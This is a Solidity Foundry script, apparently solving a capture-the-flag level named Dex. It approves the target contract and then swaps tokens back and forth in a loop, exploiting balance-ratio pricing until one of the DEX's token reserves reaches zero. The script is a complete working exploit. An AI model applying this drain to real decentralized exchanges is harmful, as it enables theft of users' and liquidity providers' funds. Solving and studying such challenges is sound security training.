// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Dex} from "../src/Dex.sol";
import "../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract DexScript is Script {
    Dex dex = Dex(payable(0x513d2c968e48d5Bb7683266f51bFB56d0A0e5641));
    IERC20 t1 = IERC20(0x705F7b297B47a688c96CbD5b7C7c9cBB1CdFEd3B);
    IERC20 t2 = IERC20(0x9df5CE9E769cA57aA5b06F649D0011fBF3222DC9);

    function run() external {
        vm.startBroadcast();

        // token1, token2 에 접근할 수 있도록 설정
        dex.approve(address(dex), 1000);

        while (true) {
            uint256 playerT1 = dex.balanceOf(address(t1), msg.sender);
            uint256 playerT2 = dex.balanceOf(address(t2), msg.sender);
            uint256 dexT1 = dex.balanceOf(address(t1), address(dex));
            uint256 dexT2 = dex.balanceOf(address(t2), address(dex));

            if (playerT1 > 0) {
                uint256 amount = playerT1 > dexT1 ? dexT1 : playerT1;
                dex.swap(address(t1), address(t2), amount);
            } else if (playerT2 > 0) {
                uint256 amount = playerT2 > dexT2 ? dexT2 : playerT2;
                dex.swap(address(t2), address(t1), amount);
            } else {
                break;
            }

            // DEX의 잔액이 0이 되면 종료
            if (dex.balanceOf(address(t1), address(dex)) == 0 || dex.balanceOf(address(t2), address(dex)) == 0) {
                break;
            }
        }

        vm.stopBroadcast();
    }
}
